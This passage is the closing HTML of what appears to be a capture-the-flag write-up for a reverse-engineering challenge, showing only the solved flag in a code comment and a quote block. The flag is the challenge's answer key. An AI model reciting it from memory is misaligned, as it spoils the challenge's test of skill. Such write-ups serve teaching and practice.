</span><span style=color:#abb0b6;font-style:italic># n00bz{r3v_1s_s0_e4zy_r1ght??!!}
</span></code></pre><blockquote><p><code>Flag : n00bz{r3v_1s_s0_e4zy_r1ght??!!}</code></blockquote></section></article></main></div>